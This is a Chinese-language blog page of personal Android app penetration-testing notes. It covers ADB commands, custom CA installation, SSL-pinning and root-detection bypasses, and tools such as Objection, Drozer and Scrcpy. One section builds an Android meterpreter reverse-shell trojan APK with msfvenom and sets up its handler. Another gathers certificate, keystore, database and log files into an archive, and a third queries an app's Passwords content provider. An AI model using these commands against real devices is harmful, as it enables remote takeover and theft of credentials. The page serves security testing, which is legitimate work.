@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CKMT2J522R"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-CKMT2J522R', { 'anonymize_ip': false });
+}
+</script>
+
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+  Android Test Cheat Sheet &ndash; 春田花花幼稚园
+
+    </title>
+    
+    
+    <meta name="description" property="og:description" content="更新一些Android APP测试的技巧。
+|blog under go1f.github.io">
+    
+
+    <meta name="apple-mobile-web-app-title" content="春田花花幼稚园">
+    
+    
+    <link rel="icon" href="/favicon-64.png">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="mask-icon" size="any" href="/pinned-icon.svg">
+    
+    
+    
+
+
+    <link rel="stylesheet" href="/assets/syntax.css">
+    <link rel="stylesheet" href="/assets/primer-build.css">
+    <link rel="stylesheet" href="/assets/style.css">
+  </head>
+
+
+  <body class="bg-gray">
+    <div id="holy" class="container-lg bg-white h-100">
+
+      <div id="header" class="px-1 bg-white">
+        <nav class="UnderlineNav UnderlineNav--right px-2">
+  <a class="UnderlineNav-actions muted-link h2" href="http://92643.cn:92">
+    春田花花幼稚园
+  </a>
+
+  
+  
+  <div class="UnderlineNav-body">
+    
+    
+    
+    <a class="UnderlineNav-item " href="/whisper/">
+      
+      <span>离骚</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/skill/">
+      
+      <span>拙技</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/glance/">
+      
+      <span>速览</span>
+    </a>
+    
+    
+  </div>
+  
+</nav>
+
+      </div>
+
+      <div role="main" id="main" class="holy-main markdown-body px-4 bg-white">
+        
+
+<div class="Subhead">
+  <div class="Subhead-heading">
+    <div class="h1 mt-3 mb-1">Android Test Cheat Sheet</div>
+  </div>
+  <div class="Subhead-description">
+    
+
+
+
+
+
+
+    
+    <div class="float-md-right">
+      <span title="Lastmod: 2023-06-17. Published at: 2023-06-15.">
+        
+          Lastmod: 2023-06-17
+        
+      </span>
+    </div>
+    
+  </div>
+</div>
+<article>
+  
+  <section class="pb-6 mb-3 border-bottom">
+    <p>更新一些Android APP测试的技巧。</p>
+<h2 id="为了adb">为了ADB</h2>
+<h3 id="开启adb调试的若干方式">开启ADB调试的若干方式</h3>
+<p>参考同站的真无线ADB文章</p>
+<h3 id="adb-cheat-sheet">ADB Cheat Sheet</h3>
+<p>模拟点击</p>
+<pre tabindex="0"><code>#获取当前点击手势坐标
+adb shell getevent -l |grep ABS_MT_POSITION
+#转换XY坐标为10进制
+#循环点击并计数
+adb shell &#39;count=1; while true; do echo &#34;序号: $count&#34;; input tap 849 894; sleep 0.1; count=$((count+1)); done&#39;
+# or
+adb shell &#39;while true; do input tap 849 894; sleep 0.1; done&#39;
+</code></pre><p><a href="https://igor.mp/blog/2018/02/23/using-adb-simulate-touch-events.html">Using ADB to quickly simulate touch events</a></p>
+<p>调出系统设置界面</p>
+<pre tabindex="0"><code>adb shell am start -n com.android.settings/.Settings
+</code></pre><p>定位APP</p>
+<pre tabindex="0"><code>adb shell dumpsys window | grep mCurrentFocus
+adb shell dumpsys window windows
+</code></pre><p>Tcpudmp远程抓包</p>
+<pre tabindex="0"><code>adb shell &#34;tcpdump -i any -s 0 -w - not port 5555&#34; | wireshark -k -i -
+</code></pre><p>截屏</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">adb exec-out screencap -p &gt; 1.png
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">adb shell screencap /sdcard/1.png
+</span></span><span class="line"><span class="cl">adb pull /sdcard/1.png ./
+</span></span></code></pre></div><p>获取最近任务</p>
+<pre tabindex="0"><code>adb shell dumpsys activity recents |grep &#34;* Recent&#34;
+adb shell dumpsys activity services
+</code></pre><p>获取系统版本</p>
+<pre tabindex="0"><code>adb shell getprop ro.build.version.release
+</code></pre><h2 id="为了抓包">为了抓包</h2>
+<p>Android 7.0后的抓包，绕不过SSL-Pinning怎么绕。</p>
+<p>首先假设App信任系统证书，比较简单，自制系统证书导入即可。</p>
+<p>假若App自建检测证书信任链，这里的方案是Objection Hook或Lsposed模块的TrustMeAlready。</p>
+<h3 id="burpsuiteandroid系统证书自制">Burpsuite/Android系统证书自制</h3>
+<p><a href="https://www.ibm.com/docs/zh/api-connect/10.0.1.x?topic=overview-generating-self-signed-certificate-using-openssl">使用 OpenSSL 生成自签名证书</a></p>
+<p>生成一个有效期为1年的证书：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+</span></span></code></pre></div><p>key.pem为私钥，certficate.pem为证书，在firefox证书颁发机构可以直接导入。</p>
+<p>将密钥和证书组合在 PKCS#12 (P12) 捆绑软件中，后续在burp导入。</p>
+<pre tabindex="0"><code>openssl pkcs12 -inkey key.pem -in certificate.pem -export -out certificate.p12
+#enter-your-passwd
+</code></pre><p>制作安卓的系统证书，将公钥certificate.pem重命名为类似78ecfd2e.0的名字。</p>
+<pre tabindex="0"><code>name=$(openssl x509 -inform PEM -subject_hash_old -in certificate.pem | head -1)
+cp certificate.pem &#34;$name.0&#34;
+</code></pre><p>导入到Android系统的系统证书目录</p>
+<pre tabindex="0"><code>adb devices
+adb root
+adb remount
+adb push xxxxxxxx.0 /system/etc/security/cacerts/
+adb shell
+#修改用户、读取权限
+chown root:root /system/etc/security/cacerts/xxxxxxxx.0
+chmod 644 /system/etc/security/cacerts/xxxxxxxx.0
+</code></pre><h3 id="配置全局代理">配置全局代理</h3>
+<pre tabindex="0"><code>adb shell settings get global http_proxy
+adb shell settings put global http_proxy 10.1.0.100:8080
+
+#清除代理
+adb shell settings put global http_proxy :0
+
+#不要做删除！！！！删除并不会清空代理
+#adb shell settings delete global http_proxy
+#adb shell settings delete global global_http_proxy_host
+#adb shell settings delete global global_http_proxy_port
+
+adb shell settings list global |grep proxy
+</code></pre><h3 id="objection-sslpinning-disable">objection-sslpinning-disable</h3>
+<pre tabindex="0"><code>adb push frida-server-16.0.19-android-arm64 /data/local/tmp
+
+adb root
+adb shell
+#On Android:
+/data/local/tmp/frida-server-16.0.19-android-arm64 &amp;
+# ERROR：frida.TimedOutError: unexpectedly timed out while waiting for signal from process with PID 2292 ==&gt; usap64
+# Solved by:
+#setprop persist.device_config.runtime_native.usap_pool_enabled false
+
+
+python3 -m pip install objection
+objection -d -g com.cloudy.component explore
+android root disable
+android sslpinning disable
+</code></pre><p>参考：</p>
+<p><a href="https://www.hackingarticles.in/android-hooking-and-sslpinning-using-objection-framework/">Android Hooking and SSLPinning using Objection Framework</a></p>
+<h3 id="trustmealready">TrustMeAlready</h3>
+<p>TrustMeAlready是LSPosed框架的模块，前身是xposed（不再维护）框架。</p>
+<p>LSPosed现在是Magisk模块。</p>
+<p>LSPosed有riru与zygisk版，riru已不再维护，推荐zygisk版。</p>
+<p>Release下载LSPosed安装包，https://github.com/LSPosed/LSPosed</p>
+<p>Magisk刷入后重启。</p>
+<p>下滑菜单栏可见LSPosed的通知栏，点击即可进入管理界面。</p>
+<p>Release下载TrustMeAlready.apk，https://github.com/ViRb3/TrustMeAlready</p>
+<p>安装即可，点击模块，勾选目标应用。</p>
+<p>参考链接：</p>
+<p>非常全面的抓包对抗思维导图，https://github.com/r0ysue/r0capture/blob/main/README.md</p>
+<h2 id="反调试">反调试</h2>
+<h3 id="root检测">ROOT检测</h3>
+<h4 id="改名法">改名法</h4>
+<p>移除su文件，改写su安装包名。</p>
+<pre tabindex="0"><code>adb root
+adb remount
+adb shell
+find / -name su 2&gt;/dev/null
+mv /system/bin/su /system/bin/su1
+pm list packages ｜grep su
+</code></pre><p>备注：笔者在Magisk 25.x测试可修改sysytem目录，升级26.1后修改系统文件则发现提示Read-only file system报错。</p>
+<h4 id="magisk-denylist">Magisk DenyList</h4>
+<p>笔者Android 13+Magisk26.1，测试可用，Magisk自带的Hook，让应用无法探测到Root环境相关的文件，然而也会让Magisk不能Hook该应用。</p>
+<ol>
+<li>开启Zygisk模块</li>
+<li>配置排除清单</li>
+<li>勾选目标应用</li>
+<li>点击开启强制排除</li>
+</ol>
+<p>还可以进一步地，在Magisk点击Magisk Hide，随机包名重安装。</p>
+<p>图文操作可参考：</p>
+<p><a href="https://droidwin.com/how-to-hide-root-from-apps-via-magisk-denylist/">How To Hide Root From Apps Via Magisk DenyList [Android 13]</a></p>
+<h2 id="misc-tools">Misc. Tools</h2>
+<h3 id="scrcpy">Scrcpy</h3>
+<p>屏幕投影</p>
+<pre tabindex="0"><code>brew install scrcpy
+scrcpy
+</code></pre><h3 id="termux">Termux</h3>
+<p>镜像源加速</p>
+<pre tabindex="0"><code>termux-change-repo
+#在图形界面引导下，使用自带方向键可上下移动。 
+#第一步使用空格选择需要更换的仓库，之后在第二步选择 TUNA/BFSU 镜像源。确认无误后回车，镜像源会自动完成更换。
+#然后就可以畅快下载Python等等环境了。
+</code></pre><h3 id="固件解包">固件解包</h3>
+<pre tabindex="0"><code>docker run --rm -v &#34;${PWD}&#34;:/data -it vm03/payload_dumper /data/payload.bin --out /data
+</code></pre><p>参考：https://github.com/vm03/payload_dumper</p>
+<h3 id="app提取">APP提取</h3>
+<p>获取指定APP的路径</p>
+<pre tabindex="0"><code># pm list packages
+# pm path com.android.shell
+package:/system/priv-app/Shell/Shell.apk
+</code></pre><p>常见路径</p>
+<pre tabindex="0"><code>/vendor/app/
+/system/app
+/system/priv-app，则该应用程序为系统应用。
+/data/app
+/data/app-private
+</code></pre><p>一键提取的APP</p>
+<ul>
+<li><a href="https://apkpure.com/apk%E6%8F%90%E5%8F%96%E5%99%A8-%E6%97%A0%E5%B9%BF%E5%91%8A/com.tgc.getapk">com.tgc.getapk</a></li>
+<li><a href="https://apkpure.com/tw/apk-extractor/com.ext.ui/">com.ext.ui</a></li>
+</ul>
+<h3 id="msf木马">MSF木马</h3>
+<p>笔者发现，不是所有电脑都能生成payload，存在玄学（原因待查）。</p>
+<pre tabindex="0"><code>msfvenom –p android/meterpreter/reverse_tcp LHOST=&lt;your-ip&gt; LPORT=8999 -a dalvik --platform android -o android_shell.apk
+
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 8999
+run
+</code></pre><h3 id="解析androidmanifestxml">解析AndroidManifest.xml</h3>
+<pre tabindex="0"><code>java -jar ./AXMLPrinter2.jar ./CarLauncherHMI/AndroidManifest.xml &gt; AndroidManifest.xml
+</code></pre><p>参考：</p>
+<p><a href="https://code.google.com/archive/p/android4me/downloads">https://code.google.com/archive/p/android4me/downloads</a></p>
+<p><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/android4me/AXMLPrinter2.jar">AXMLPrinter2.jar</a></p>
+<h3 id="nmaptcpdumpbusybox">NMAP/TCPDUMP/BusyBox</h3>
+<p><a href="https://github.com/kost/nmap-android">https://github.com/kost/nmap-android</a></p>
+<p><a href="https://www.androidtcpdump.com/android-tcpdump/downloads">https://www.androidtcpdump.com/android-tcpdump/downloads</a></p>
+<p><a href="https://github.com/meefik/busybox/releases/tag/1.34.1">https://github.com/meefik/busybox/releases/tag/1.34.1</a></p>
+<h3 id="识别隐藏交互元素">识别隐藏交互元素</h3>
+<p><a href="https://www.apkmirror.com/apk/google-inc/accessibility-scanner/accessibility-scanner-2-3-0-456557213-release/google-accessibility-scanner-2-3-0-456557213-android-apk-download/">Accessibility Scanner</a></p>
+<p>谷歌官方发布的一个辅助功能工具，可帮助您检测Android应用中的可访问性问题。它可以识别当前界面的所有交互元素，包括按钮位置和隐藏按钮。</p>
+<h3 id="全局查找敏感文件">全局查找敏感文件</h3>
+<pre tabindex="0"><code>find / -type f \( -name &#34;*.cer&#34; -o -name &#34;*.crt&#34; -o -name &#34;*.rsa&#34; -o -name &#34;*.p7b&#34; -o -name &#34;*.p7r&#34; -o -name &#34;*.p7c&#34; -o -name &#34;*.p7m&#34; -o -name &#34;*.p7s&#34; -o -name &#34;*.pem&#34; -o -name &#34;*.p10&#34; -o -name &#34;*.csr&#34; -o -name &#34;*.pvk&#34; -o -name &#34;*.spc&#34; -o -name &#34;*.jks&#34; -o -name &#34;*.ks&#34; -o -name &#34;*.jce&#34; -o -name &#34;*.p12&#34; -o -name &#34;*.pfx&#34; -o -name &#34;*.bks&#34; -o -name &#34;*.ubr&#34; -o -name &#34;*.db&#34; -o -name &#34;*.log&#34; \) -exec tar -czvf /data/local/tmp/files.tar.gz {} + 2&gt;/dev/null
+</code></pre><h3 id="drozer">Drozer</h3>
+<p>开启开发者选项-ADB网络调试</p>
+<pre tabindex="0"><code>docker run -it fsecurelabs/drozer
+drozer console connect --server 192.168.136.86:31415
+</code></pre><pre tabindex="0"><code>run scanner.provider.finduris -a (package name)
+run app.provider.query
+content://com.mwr.example.sieve.DBContentProvider/Passwords/
+</code></pre><pre tabindex="0"><code>run app.activity.info --package  (package name)
+run app.activity.start --component   com.isi.testapp    com.isi.testapp.Welcome
+</code></pre><pre tabindex="0"><code>run app.service.info -a com.csair.tangces
+</code></pre><p>Android NDK</p>
+<p><a href="https://github.com/android/ndk/wiki/Unsupported-Downloads">https://github.com/android/ndk/wiki/Unsupported-Downloads</a></p>
+<p>临时目录，可读可写可执行</p>
+<pre tabindex="0"><code>/data/local/tmp/
+</code></pre><p>debuggable的应用导出数据</p>
+<pre tabindex="0"><code>adb shell &#34;run-as com.tgc.getapk tar -cf - /data/data/ com.tgc.getapk/ &#34; &gt; app_data.tar
+</code></pre><h3 id="壳识别">壳识别</h3>
+<p>略</p>
+<h3 id="apk安装">APK安装</h3>
+<pre tabindex="0"><code>pm install termux.apk
+pm list packages|grep termux
+</code></pre><pre tabindex="0"><code>brew install --cask android-sdk #兼容Java8
+
+#安装build-tools
+sdkmanager &#34;build-tools;30.0.3&#34;
+#路径
+/opt/homebrew/Caskroom/android-sdk/4333796/build-tools/30.0.3/
+</code></pre><h3 id="重安装系统apk">重安装系统APK</h3>
+<p><a href="https://forum.xda-developers.com/t/how-to-use-the-hardware-test-app-from-asus-on-a-zenfone-running-a-customrom.4461533/">How to use the Hardware Test App from ASUS on a Zenfone running a CustomROM</a></p>
+  </section>
+
+  <section>
+    
+      
+    
+  </section>
+</article>
+
+      </div>
+
+      <div id="side" class="pr-1 bg-white">
+        <aside class="pr-3">
+          
+  
+    <div id="toc" class="Box Box--blue mb-3">
+      <b>Android Test Cheat Sheet</b><nav id="TableOfContents">
+  <ul>
+    <li><a href="#为了adb">为了ADB</a>
+      <ul>
+        <li><a href="#开启adb调试的若干方式">开启ADB调试的若干方式</a></li>
+        <li><a href="#adb-cheat-sheet">ADB Cheat Sheet</a></li>
+      </ul>
+    </li>
+    <li><a href="#为了抓包">为了抓包</a>
+      <ul>
+        <li><a href="#burpsuiteandroid系统证书自制">Burpsuite/Android系统证书自制</a></li>
+        <li><a href="#配置全局代理">配置全局代理</a></li>
+        <li><a href="#objection-sslpinning-disable">objection-sslpinning-disable</a></li>
+        <li><a href="#trustmealready">TrustMeAlready</a></li>
+      </ul>
+    </li>
+    <li><a href="#反调试">反调试</a>
+      <ul>
+        <li><a href="#root检测">ROOT检测</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc-tools">Misc. Tools</a>
+      <ul>
+        <li><a href="#scrcpy">Scrcpy</a></li>
+        <li><a href="#termux">Termux</a></li>
+        <li><a href="#固件解包">固件解包</a></li>
+        <li><a href="#app提取">APP提取</a></li>
+        <li><a href="#msf木马">MSF木马</a></li>
+        <li><a href="#解析androidmanifestxml">解析AndroidManifest.xml</a></li>
+        <li><a href="#nmaptcpdumpbusybox">NMAP/TCPDUMP/BusyBox</a></li>
+        <li><a href="#识别隐藏交互元素">识别隐藏交互元素</a></li>
+        <li><a href="#全局查找敏感文件">全局查找敏感文件</a></li>
+        <li><a href="#drozer">Drozer</a></li>
+        <li><a href="#壳识别">壳识别</a></li>
+        <li><a href="#apk安装">APK安装</a></li>
+        <li><a href="#重安装系统apk">重安装系统APK</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+  
+
+  
+    <div>
+      
+    </div>
+  
+
+        </aside>
+      </div>
+
+      <div id="footer" class="pt-2 pb-3 bg-white text-center">
+        
+
+  <span class="text-small text-gray">
+    © jyufu 2020-2023 &middot; 
+
+    Powered by the
+    <a href="https://github.com/qqhann/hugo-primer" class="link-gray-dark">Hugo-Primer</a> theme for
+    <a href="https://gohugo.io" class="link-gray-dark">Hugo</a>.
+  </span>
+
+
+      </div>
+    </div>
+
+    
+  </body>
+</html>
